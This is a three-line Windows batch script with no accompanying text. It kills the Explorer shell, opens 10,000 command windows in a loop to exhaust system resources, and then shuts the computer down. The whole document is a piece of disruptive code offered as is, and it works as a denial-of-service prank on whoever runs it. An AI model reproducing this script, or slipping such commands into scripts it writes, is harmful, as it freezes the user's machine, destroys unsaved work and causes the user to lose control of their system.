taskkill /f /im explorer.exe
for /l %%i in (1,1,10000) do start cmd.exe
shutdown -s
